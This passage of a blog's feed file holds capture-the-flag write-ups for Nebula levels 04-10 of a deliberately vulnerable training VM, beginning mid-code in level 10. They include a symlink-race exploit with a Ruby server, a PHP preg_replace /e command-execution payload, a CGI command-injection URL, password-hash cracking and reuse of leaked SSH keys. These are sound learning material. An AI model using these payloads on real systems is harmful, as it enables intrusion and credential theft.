+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>      
+</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="cp">#undef HITHERE</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<p>There at two files in the directory /home/flag10, <em>flag10</em> and <em>token</em>. The source code of executable <em>flag10</em> in shown above, and <em>token</em> contains the password of user <em>flag10</em>. The goal is to read the content of <em>token</em>.</p>
+
+<p>The attack comes from a common bug called <a href="http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use">Time of check to time of use</a>, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:</p>
+
+<ol>
+<li>pass <em>/home/level10/token</em> whick links to a real user(<em>level10</em>) readable file <em>/home/level10/test</em> to the program as <code>argv[1]</code></li>
+<li><em>/home/flag10/flag10</em> checks whether this file is accessable at line 24(with the result true)</li>
+<li>modify the file to link to <em>/home/flag10/token</em> when <em>/home/flag10/flag10</em> is executing code between line 24 and line 54</li>
+<li>when <em>/home/flag10/flag10</em> reads the file at line 54, it reads <em>/home/flag10/token</em></li>
+</ol>
+
+
+<p>The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the <em>flag10</em> program will send a banner before actually read the file(line 46), this leaves me some time to make some change!</p>
+
+<p>Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file <em>/home/level10/token</em> immediately after the server accepts a connection from the client, I wrote this server code in Ruby:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">server</span> <span class="o">=</span> <span class="no">TCPServer</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">18211</span><span class="p">)</span>
+</span><span class='line'><span class="kp">loop</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">accept</span>
+</span><span class='line'>    <span class="sb">`rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`</span>
+</span><span class='line'>    <span class="k">while</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">gets</span>
+</span><span class='line'>        <span class="nb">puts</span> <span class="s2">&quot;RECV: </span><span class="si">#{</span><span class="n">msg</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After the server was started, I triggered the vulnerability with the following command</p>
+
+<pre><code>$ /home/flag10/flag10 ~/token 127.0.0.1
+</code></pre>
+
+<p>Note that the symbolic file <em>~/token</em> must exist and point to a file that is readable by user <em>level10</em> before the program <em>flag10</em> is executed.</p>
+
+<p>The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level10@nebula:~<span class="nv">$ </span>ruby serv.rb
+</span><span class='line'>RECV: .oO Oo.
+</span><span class='line'>RECV: hello world
+</span><span class='line'>
+</span><span class='line'>level10@nebula:~<span class="nv">$ </span>ruby serv.rb
+</span><span class='line'>RECV: .oO Oo.
+</span><span class='line'>RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 09]]></title>
+    <link href="http://hanjc.me/blog/2014/01/24/nebula-level09/"/>
+    <updated>2014-01-24T11:43:40+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/24/nebula-level09</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>There&rsquo;s a C setuid wrapper for some vulnerable PHP code&hellip;</p>
+
+<p>To do this level, log in as the <em>level09</em> account with the password <em>level09</em>. Files for this level can be found in /home/flag09.</p>
+
+<h3>Source code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>This php snippet does the following things:</p>
+
+<ul>
+<li>read the content of file $argv[1]</li>
+<li>replace all the text paterns liket &ldquo;[email <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#104;&#x6a;&#x63;&#64;&#x68;&#x61;&#x6e;&#106;&#x63;&#x2e;&#109;&#101;">&#x68;&#x6a;&#x63;&#64;&#x68;&#97;&#x6e;&#x6a;&#99;&#46;&#109;&#101;</a>]&rdquo; with &ldquo;hjc AT hanjc dot me&rdquo;</li>
+<li>replace all the &ldquo;[&rdquo; with &ldquo;&lt;&rdquo;, replace &ldquo;]&rdquo; with &ldquo;>&rdquo;</li>
+</ul>
+
+
+<p>At the very first glace, there seems to be no problem about this code (well, turns out to be that anyone who is familiar with php security would recognize immediatly the vulnerability). But what I knew was that if there be something wrong, it must be the php function <code>preg_replace</code>.</p>
+
+<p>Google this function and I found many useful thing. There is a <a href="https://bugs.php.net/bug.php?id=35960">bug report</a> related to this function, and another <a href="http://www.madirish.net/402">article</a> explains in detail about how to exploit this vulnerability.</p>
+
+<p>In general, the vulnerability exists when a &ldquo;\e&rdquo; is set in the PCRE expression provided to the <code>preg_replace</code> function (as in the code above), in this case, php will do normal substitution of backreferences in the replacement string, evaluate it as PHP code, and use the result for replacing the search string, as mentioned <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">here</a>. This link also provides an input string tha could exploit this function, which is</p>
+
+<pre><code>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;
+</code></pre>
+
+<p>As my goal is to run system command with this function, I modified this attack string to be</p>
+
+<pre><code>[email {${system('touch /home/flag09/test')}}]
+</code></pre>
+
+<p>Save this string in /tmp/txt, and run the following command</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/home/flag09/flag09 /tmp/txt noused
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Although the program produced some errors, the file /home/flag09/test indeed appeared! So this should be a doable way to execute any command, but it is not convenient. Notice there is an additional argument <code>$use_me</code> to function <code>markup</code> that is never used in the function, the name of this variable indicates its purpose, which is too obvious to ignore. So I modified /tmp/txt to</p>
+
+<pre><code>[email {${system($use_me)}}]
+</code></pre>
+
+<p>Now I could run any command with</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/home/flag09/flag09 /tmp/txt <span class="s2">&quot;any command&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 08]]></title>
+    <link href="http://hanjc.me/blog/2014/01/24/nebula-level08/"/>
+    <updated>2014-01-24T11:43:31+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/24/nebula-level08</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
+
+<p>To do this level, log in as the <em>level08</em> account with the password <em>level08</em>. Files for this level can be found in /home/flag08.</p>
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>用<em>level08</em>登录之后回看到一个名为<em>capture.pcap</em>的文件，记录了一次抓包的结果。把这个文件scp出来之后分析，中间有一处显示：</p>
+
+<pre><code>Password: backdoor...00Rm8.ate
+</code></pre>
+
+<p>看样子是<em>flag08</em>用户的密码，不过用过十六进制编辑器的小伙伴们都知道，&#8221;.&ldquo;可能是任何空白字符，不能简单的认为密码就是“backdoor&hellip;00Rm8.ate”。查看这部分的十六进制，发现“.”对应的是0x7f，查了一下<a href="http://www.asciitable.com/">ASCII码表</a>发现0x7f是DEL，也就是删除键，所以实际的密码应该是“backd00Rm8.ate”。</p>
+
+<p>还挺会玩儿的，拿0替代了o……</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 07]]></title>
+    <link href="http://hanjc.me/blog/2014/01/13/nebula-level07/"/>
+    <updated>2014-01-13T15:49:10+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/13/nebula-level07</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>The <em>flag07</em> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
+
+<p>To do this level, log in as the <em>level07</em> account with the password <em>level07</em>. Files for this level can be found in /home/flag07.</p>
+
+<h3>Source Code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>There is a <em>thttpd</em> server started with the configuration file <em>/home/flag07/thttpd.conf</em>, in which there is only one page named <em>index.cgi</em> with the above code. This perl script mainly executes a <code>ping</code> command with the user specified argument <code>Host</code>, and prints the output onto the webpage.</p>
+
+<p>First access the web page through a browser with the following url:</p>
+
+<pre><code>http://192.168.11.118:7007/index.cgi?Host=127.0.0.1
+</code></pre>
+
+<p>And the page looks fine. As the perl script does not check the user input, so we can leaverage it to execute any commands with user <em>flag07</em> (as the http server starts with user <em>flag07&rsquo;s</em> privileage, which is configured in <em>thttpd.conf</em>). Similar to previous exercises, I would like to pass in the argument Host=&ldquo;127.0.0.1;/bin/getflag&rdquo;, so I accessed the following url directly</p>
+
+<pre><code>http://192.168.11.118:7007/index.cgi?Host=127.0.0.1%3B%2Fbin%2Fgetflag
+</code></pre>
+
+<p>And it hacks!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 06]]></title>
+    <link href="http://hanjc.me/blog/2014/01/13/nebula-level06/"/>
+    <updated>2014-01-13T15:48:33+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/13/nebula-level06</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>The <em>flag06</em> account credentials came from a legacy unix system.</p>
+
+<p>To do this level, log in as the <em>level06</em> account with the password <em>level06</em> . Files for this level can be found in /home/flag06.</p>
+
+<!-- more -->
+
+
+<p>Check out /etc/passwd</p>
+
+<pre><code>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+</code></pre>
+
+<p>Decrypted with John the Ripper, and got the login password.</p>
+
+<p><a href="http://www.governmentsecurity.org/articles/crack-unix-linux-passwords.html">reference</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 05]]></title>
+    <link href="http://hanjc.me/blog/2014/01/13/nebula-level05/"/>
+    <updated>2014-01-13T14:16:44+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/13/nebula-level05</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>Check the <em>flag05</em> home directory. You are looking for weak directory permissions</p>
+
+<p>To do this level, log in as the <em>level05</em> account with the password <em>level05</em> . Files for this level can be found in /home/flag05.</p>
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>Copy the file <em>/home/flag05/.backup/backup-19072011.tgz</em> in to home directory of <em>level05</em>.</p>
+
+<p>extract it</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level05@nebula:~<span class="nv">$ </span>tar -xvf backup-19072011.tgz
+</span><span class='line'>.ssh/
+</span><span class='line'>.ssh/id_rsa.pub
+</span><span class='line'>.ssh/id_rsa
+</span><span class='line'>.ssh/authorized_keys
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So this should be the id key of user <em>flag05</em>, try to use <code>ssh</code> to login with user <em>flag05</em> without a password, and it successed.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level05@nebula:~<span class="nv">$ </span>ssh flag05@localhost
+</span><span class='line'>
+</span><span class='line'>      _   __     __          __
+</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
+</span><span class='line'>    /  |/ / _ <span class="se">\/</span> __ <span class="se">\/</span> / / / / __ <span class="sb">`</span>/
+</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ /
+</span><span class='line'>  /_/ |_/<span class="se">\_</span>__/_.___/<span class="se">\_</span>_,_/_/<span class="se">\_</span>_,_/
+</span><span class='line'>
+</span><span class='line'>    exploit-exercises.com/nebula
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>For level descriptions, please see the above URL.
+</span><span class='line'>
+</span><span class='line'>To log in, use the username of <span class="s2">&quot;levelXX&quot;</span> and password <span class="s2">&quot;levelXX&quot;</span>, where
+</span><span class='line'>XX is the level number.
+</span><span class='line'>
+</span><span class='line'>Currently there are 20 levels <span class="o">(</span>00 - 19<span class="o">)</span>.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Welcome to Ubuntu 11.10 <span class="o">(</span>GNU/Linux 3.0.0-12-generic i686<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>New release <span class="s1">&#39;12.04 LTS&#39;</span> available.
+</span><span class='line'>Run <span class="s1">&#39;do-release-upgrade&#39;</span> to upgrade to it.
+</span><span class='line'>
+</span><span class='line'>flag05@nebula:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 04]]></title>
+    <link href="http://hanjc.me/blog/2014/01/10/nebula-level04/"/>
+    <updated>2014-01-10T20:43:48+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/10/nebula-level04</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
+
+<p>To do this level, log in as the level04 account with the password level04 . Files for this level can be found in /home/flag04.</p>
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>Source code for /home/flag04/flag04 is</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'>
